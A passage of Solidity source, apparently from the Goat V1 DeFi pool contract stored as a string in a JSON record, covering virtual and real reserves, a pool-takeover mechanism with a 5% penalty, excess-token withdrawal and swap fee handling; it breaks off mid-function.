IERC20(_token).balanceOf(address(this));\n        uint256 wethBalance = IERC20(_weth).balanceOf(address(this));\n        _update(wethBalance, tokenBalance, true);\n    }\n\n    function _getActualReserves() internal view returns (uint112 reserveEth, uint112 reserveToken) {\n        reserveEth = _reserveEth;\n        reserveToken = _reserveToken;\n    }\n\n    function _getReserves(uint32 vestingUntil_, uint256 ethReserve, uint256 tokenReserve)\n        internal\n        view\n        returns (uint112 reserveEth, uint112 reserveToken)\n    {\n        // just pass eth reserve and token reserve here only use virtual eth and initial token match\n        // if pool has not turned into an AMM\n        if (vestingUntil_ != _MAX_UINT32) {\n            // Actual reserves\n            reserveEth = uint112(ethReserve);\n            reserveToken = uint112(tokenReserve);\n        } else {\n            uint256 initialTokenMatch = _initialTokenMatch;\n            uint256 virtualEth = _virtualEth;\n            uint256 virtualToken = _getVirtualTokenAmt(virtualEth, _bootstrapEth, initialTokenMatch);\n            // Virtual reserves\n            reserveEth = uint112(virtualEth + ethReserve);\n            reserveToken = uint112(virtualToken + tokenReserve);\n        }\n    }\n\n    /// @notice returns real reserves if pool has turned into an AMM else returns virtual reserves\n    function getReserves() public view returns (uint112 reserveEth, uint112 reserveToken) {\n        (reserveEth, reserveToken) = _getReserves(_vestingUntil, _reserveEth, _reserveToken);\n    }\n\n    /**\n     * @notice Withdraws excess tokens from the pool and converts it into an AMM.\n     * @dev Allows the initial liquidity provider to withdraw tokens if\n     *  bootstrap goals are not met even after 1 month of launching the pool and\n     *  forces the pool to transition to an AMM with the real reserve of with and\n     *  matching tokens required at that point.\n     * Requirements:\n     * - Can only be called by the initial liquidity provider.\n     * - Can only be called 30 days after the contract's genesis.\n     * - Pool should transition to an AMM after successful exectuion of this function.\n     * Post-Conditions:\n     * - Excess tokens are returned to the initial liquidity provider.\n     * - The pool transitions to an AMM with the real reserves of ETH and tokens.\n     * - Deletes the pair from the factory if eth raised is zero.\n     */\n    function withdrawExcessToken() external {\n        uint256 timestamp = block.timestamp;\n        // initial liquidty provider can call this function after 30 days from genesis\n        if (_genesis + _THIRTY_DAYS > timestamp) revert GoatErrors.PresaleDeadlineActive();\n        if (_vestingUntil != _MAX_UINT32) {\n            revert GoatErrors.ActionNotAllowed();\n        }\n\n        address initialLiquidityProvider = _initialLPInfo.liquidityProvider;\n        if (msg.sender != initialLiquidityProvider) {\n            revert GoatErrors.Unauthorized();\n        }\n\n        // as bootstrap eth is not met we consider reserve eth as bootstrap eth\n        // and turn presale into an amm with less liquidity.\n        uint256 reserveEth = _reserveEth;\n\n        uint256 bootstrapEth = reserveEth;\n\n        // if we know token amount for AMM we can remove excess tokens that are staying in this contract\n        (, uint256 tokenAmtForAmm) =\n            _tokenAmountsForLiquidityBootstrap(_virtualEth, bootstrapEth, 0, _initialTokenMatch);\n\n        IERC20 token = IERC20(_token);\n        uint256 poolTokenBalance = token.balanceOf(address(this));\n\n        uint256 amountToTransferBack = poolTokenBalance - tokenAmtForAmm;\n        // transfer excess token to the initial liquidity provider\n        token.safeTransfer(initialLiquidityProvider, amountToTransferBack);\n\n        if (reserveEth != 0) {\n            _updateLiquidityAndConvertToAmm(reserveEth, tokenAmtForAmm);\n            // update bootstrap eth because original bootstrap eth was not met and\n            // eth we raised until this point should be considered as bootstrap eth\n            _bootstrapEth = uint112(bootstrapEth);\n            _update(reserveEth, tokenAmtForAmm, false);\n        } else {\n            IGoatV1Factory(factory).removePair(_token);\n        }\n    }\n\n    /**\n     * @notice Allows a team to take over a pool from malicious actors.\n     * @dev Prevents malicious actors from griefing the pool by setting unfavorable\n     *   initial conditions. It requires the new team to match the pool reserves of\n     *   WETH amount and exceed their token contribution by at least 10%.\n     *   This function also resets the pool's initial liquidity parameters.\n     * @param initParams The new initial parameters for the pool.\n     * Requirements:\n     * - Pool must be in presale period.\n     * - The `tokenAmount` must be at least 10% greater and equal to bootstrap token needed for new params.\n     * - Tokens must be transferred to the pool before calling this function.\n     * Reverts:\n     * - If the pool has already transitioned to an AMM.\n     * - If `tokenAmountIn` is less than the minimum required to take over the pool.\n     * - If `wethAmountIn` is less than the reserve ETH.\n     * Post-Conditions:\n     * - Transfers the amount of token and weth after penalty to initial lp.\n     * - Burns the initial liquidity provider's tokens and\n     *   mints new liquidity tokens to the new team based on the new `initParams`.\n     * - Resets the pool's initial liquidity parameters to the new `initParams`.\n     * - Updates the pool's reserves to reflect the new token balance.\n     */\n    function takeOverPool(GoatTypes.InitParams memory initParams) external {\n        if (_vestingUntil != _MAX_UINT32) {\n            revert GoatErrors.ActionNotAllowed();\n        }\n\n        GoatTypes.InitialLPInfo memory initialLpInfo = _initialLPInfo;\n\n        GoatTypes.LocalVariables_TakeOverPool memory localVars;\n        address to = msg.sender;\n        localVars.virtualEthOld = _virtualEth;\n        localVars.bootstrapEthOld = _bootstrapEth;\n        localVars.initialTokenMatchOld = _initialTokenMatch;\n\n        (localVars.tokenAmountForPresaleOld, localVars.tokenAmountForAmmOld) = _tokenAmountsForLiquidityBootstrap(\n            localVars.virtualEthOld,\n            localVars.bootstrapEthOld,\n            initialLpInfo.initialWethAdded,\n            localVars.initialTokenMatchOld\n        );\n\n        // new token amount for bootstrap if no swaps would have occured\n        (localVars.tokenAmountForPresaleNew, localVars.tokenAmountForAmmNew) = _tokenAmountsForLiquidityBootstrap(\n            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch\n        );\n\n        // team needs to add min 10% more tokens than the initial lp to take over\n        localVars.minTokenNeeded =\n            ((localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld) * 11000) / 10000;\n\n        if ((localVars.tokenAmountForAmmNew + localVars.tokenAmountForPresaleNew) < localVars.minTokenNeeded) {\n            revert GoatErrors.InsufficientTakeoverTokenAmount();\n        }\n\n        localVars.reserveEth = _reserveEth;\n\n        // Actual token amounts needed if the reserves have updated after initial lp mint\n        (localVars.tokenAmountForPresaleNew, localVars.tokenAmountForAmmNew) = _tokenAmountsForLiquidityBootstrap(\n            initParams.virtualEth, initParams.bootstrapEth, localVars.reserveEth, initParams.initialTokenMatch\n        );\n        localVars.reserveToken = _reserveToken;\n\n        // amount of tokens transferred by the new team\n        uint256 tokenAmountIn = IERC20(_token).balanceOf(address(this)) - localVars.reserveToken;\n\n        if (\n            tokenAmountIn\n                < (\n                    localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld - localVars.reserveToken\n                        + localVars.tokenAmountForPresaleNew + localVars.tokenAmountForAmmNew\n                )\n        ) {\n            revert GoatErrors.IncorrectTokenAmount();\n        }\n\n        localVars.pendingLiquidityFees = _pendingLiquidityFees;\n        localVars.pendingProtocolFees = _pendingProtocolFees;\n\n        // amount of weth transferred by the new team\n        uint256 wethAmountIn = IERC20(_weth).balanceOf(address(this)) - localVars.reserveEth\n            - localVars.pendingLiquidityFees - localVars.pendingProtocolFees;\n\n        if (wethAmountIn < localVars.reserveEth) {\n            revert GoatErrors.IncorrectWethAmount();\n        }\n\n        _handleTakeoverTransfers(\n            IERC20(_weth), IERC20(_token), initialLpInfo.liquidityProvider, localVars.reserveEth, localVars.reserveToken\n        );\n\n        uint256 lpBalance = balanceOf(initialLpInfo.liquidityProvider);\n        _burn(initialLpInfo.liquidityProvider, lpBalance);\n\n        // new lp balance\n        lpBalance = Math.sqrt(uint256(initParams.virtualEth) * initParams.initialTokenMatch) - MINIMUM_LIQUIDITY;\n        _mint(to, lpBalance);\n\n        _updateStateAfterTakeover(\n            initParams.virtualEth,\n            initParams.bootstrapEth,\n            initParams.initialTokenMatch,\n            wethAmountIn,\n            tokenAmountIn,\n            lpBalance,\n            to,\n            initParams.initialEth\n        );\n    }\n\n    /**\n     * @notice Updates contract state following a successful pool takeover.\n     * @dev Resets pool parameters with new values provided by the\n     *  new liquidity provider and updates the pool's reserves and initial lp info.\n     * @param virtualEth The new virtual Ether amount for the pool.\n     * @param bootstrapEth The new bootstrap Ether amount for the pool.\n     * @param initialTokenMatch The new initial token match amount for the pool.\n     * @param finalReserveWeth The final WETH reserve amount after the takeover.\n     * @param finalReserveToken The final token reserve amount after the takeover.\n     * @param liquidity The liquidity amount minted to the new liquidity provider.\n     * @param newLp The address of the new liquidity provider.\n     * @param initialWeth The initial WETH amount added by the new liquidity provider.\n     * Post-Conditions:\n     * - Sets the pool's virtual ETH, bootstrap ETH, and initial token match to the new values.\n     * - Updates the initial liquidity provider information with the new liquidity provider's details.\n     * - Updates the pool's WETH and token reserves to reflect the final state after the takeover.\n     */\n    function _updateStateAfterTakeover(\n        uint256 virtualEth,\n        uint256 bootstrapEth,\n        uint256 initialTokenMatch,\n        uint256 finalReserveWeth,\n        uint256 finalReserveToken,\n        uint256 liquidity,\n        address newLp,\n        uint256 initialWeth\n    ) internal {\n        _virtualEth = uint112(virtualEth);\n        _bootstrapEth = uint112(bootstrapEth);\n        _initialTokenMatch = uint112(initialTokenMatch);\n\n        // delete initial lp info\n        delete _initialLPInfo;\n\n        // update lp info as if it was first mint\n        _updateInitialLpInfo(liquidity, initialWeth, newLp, false, false);\n\n        _update(finalReserveWeth, finalReserveToken, false);\n    }\n\n    /**\n     * @notice Handles asset transfers during a pool takeover.\n     * @dev Transfers WETH and tokens back to the initial liquidity provider (lp) with a penalty\n     *      for potential frontrunners. This mechanism aims to discourage malicious frontrunning by\n     *      applying 5% penalty to the WETH amount being transferred.\n     * @param weth The WETH token contract.\n     * @param token The token contract associated with the pool.\n     * @param lp The address of the initial liquidity provider to receive the transferred assets.\n     * @param wethAmount Total amount of weth to be transferred. (lp share + penalty)\n     * @param tokenAmount The amount of tokens to be transferred to the lp.\n     */\n    function _handleTakeoverTransfers(IERC20 weth, IERC20 token, address lp, uint256 wethAmount, uint256 tokenAmount)\n        internal\n    {\n        if (wethAmount != 0) {\n            // Malicious frontrunners can create cheaper pools buy tokens cheap\n            // and make it costly for the teams to take over. So, we need to have penalty\n            // for the frontrunner.\n            uint256 penalty = (wethAmount * 5) / 100;\n            // actual amount to transfer\n            wethAmount -= penalty;\n            weth.safeTransfer(lp, wethAmount);\n            weth.safeTransfer(IGoatV1Factory(factory).treasury(), penalty);\n        }\n        token.safeTransfer(lp, tokenAmount);\n    }\n\n    /**\n     * @notice Withdraws the fees accrued to the address `to`.\n     * @dev Transfers the accumulated fees in weth of the liquidty proivder\n     * @param to The address to which the fees will be withdrawn.\n     * Post-conditions:\n     * - The `feesPerTokenPaid` should reflect the latest `feesPerTokenStored` value for the address `to`.\n     * - The `lpFees` owed to the address `to` are reset to 0.\n     * - The `_pendingLiquidityFees` state variable is decreased by the amount of fees withdrawn.\n     */\n    function withdrawFees(address to) external {\n        uint256 totalFees = _earned(to, feesPerTokenStored);\n\n        if (totalFees != 0) {\n            feesPerTokenPaid[to] = feesPerTokenStored;\n            lpFees[to] = 0;\n            _pendingLiquidityFees -= uint112(totalFees);\n            IERC20(_weth).safeTransfer(to, totalFees);\n        }\n        // is there a need to check if weth balance is in sync with reserve and fees?\n    }\n\n    /* ----------------------------- INTERNAL FUNCTIONS ----------------------------- */\n\n    /**\n     * @notice Updates the reserve amounts.\n     */\n    function _update(uint256 balanceEth, uint256 balanceToken, bool deductFees) internal {\n        // Update token reserves and other necessary data\n        if (deductFees) {\n            _reserveEth = uint112(balanceEth - (_pendingLiquidityFees + _pendingProtocolFees));\n        } else {\n            _reserveEth = uint112(balanceEth);\n        }\n        _reserveToken = uint112(balanceToken);\n    }\n\n    /**\n     * @notice Updates the initial liquidity provider information.\n     * @dev This function updates the `_initialLPInfo` storage variable based on the provided parameters.\n     * @param liquidity The amount of liquidity to update.\n     * @param wethAmt The amount of WETH added by the initial liquidity provider.\n     * @param lp The address of the liquidity provider.\n     * @param isBurn A flag indicating whether the update is a burn operation.\n     * @param internalBurn A flag indicating whether the update is because or pool transition (from presale to amm)\n     */\n    function _updateInitialLpInfo(uint256 liquidity, uint256 wethAmt, address lp, bool isBurn, bool internalBurn)\n        internal\n    {\n        GoatTypes.InitialLPInfo memory info = _initialLPInfo;\n\n        if (internalBurn) {\n            // update from from swap when pool converts to an amm\n            info.fractionalBalance = uint112(liquidity) / 4;\n        } else if (isBurn) {\n            if (lp == info.liquidityProvider) {\n                info.lastWithdraw = uint32(block.timestamp);\n                info.withdrawalLeft -= 1;\n            }\n        } else {\n            info.fractionalBalance = uint112(((info.fractionalBalance * info.withdrawalLeft) + liquidity) / 4);\n            info.withdrawalLeft = 4;\n            info.liquidityProvider = lp;\n            if (wethAmt != 0) {\n                info.initialWethAdded = uint104(wethAmt);\n            }\n        }\n\n        // Update initial liquidity provider info\n        _initialLPInfo = info;\n    }\n\n    /**\n     * @dev Calculates and handles the distribution of fees for each swap transaction.\n     * Fees are updated based on the amount of WETH entering or exiting the pool,\n     *  - 99 bps fees are collected of which 60% goes to the treasury\n     *  - Allocates 40% to LPs (added to reserves during presale, otherwise distributed per SNX logic).\n     *  - If protocol fees exceed a predefined threshold, they are transferred to the treasury.\n     * @param amountWethIn amount of weth entering the pool (0 if it's a sell)\n     * @param amountWethOut amount of weth exiting the pool (0 if it's a buy)\n     * @param isPresale boolean indicating if the swap is in the presale period.\n     * @return feesCollected 99bps on the amount of weth entering or exiting the pool.\n     * @return feesLp amount of lp fees share\n     * Post-conditions:\n     * - Updates the `_pendingProtocolFees` by 60% of the fees collected or resets it to 0.\n     * - Updates the `_feesPerTokenStored` if pool is not in presale.\n     */\n    function _handleFees(uint256 amountWethIn, uint256 amountWethOut, bool isPresale)\n        internal\n        returns (uint256 feesCollected, uint256 feesLp)\n    {\n        // here either amountWethIn or amountWethOut will be zero\n\n        // fees collected will be 99 bps of the weth amount\n        if (amountWethIn != 0) {\n            feesCollected = (amountWethIn * 99) / 10000;\n        } else {\n            feesCollected = (amountWethOut * 10000) / 9901 - amountWethOut;\n        }\n        // lp fess is fixed 40% of the fees collected of total 99 bps\n        feesLp = (feesCollected * 40) / 100;\n\n        uint256 pendingProtocolFees = _pendingProtocolFees;\n\n        // lp fees only updated if it's not a presale\n        if ("
    }
  ]
}